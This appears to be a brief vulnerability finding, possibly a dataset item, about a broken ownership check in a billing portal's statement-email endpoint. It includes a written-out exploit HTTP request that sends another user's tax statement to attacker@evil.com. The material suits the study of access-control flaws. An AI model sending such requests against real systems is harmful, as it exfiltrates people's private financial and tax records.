diagnosis: The view forwards statement_id directly to a Celery background worker without validating that the authenticated user owns the tax statement. The worker generates a PDF containing private financial and tax information and emails it to the attacker's specified address.
exploit_request:
POST /api/billing/statements/email/ HTTP/1.1
Host: portal.example.com
Cookie: sessionid=attacker_session
Content-Type: application/x-www-form-urlencoded

statement_id=9821&target_email=attacker@evil.com
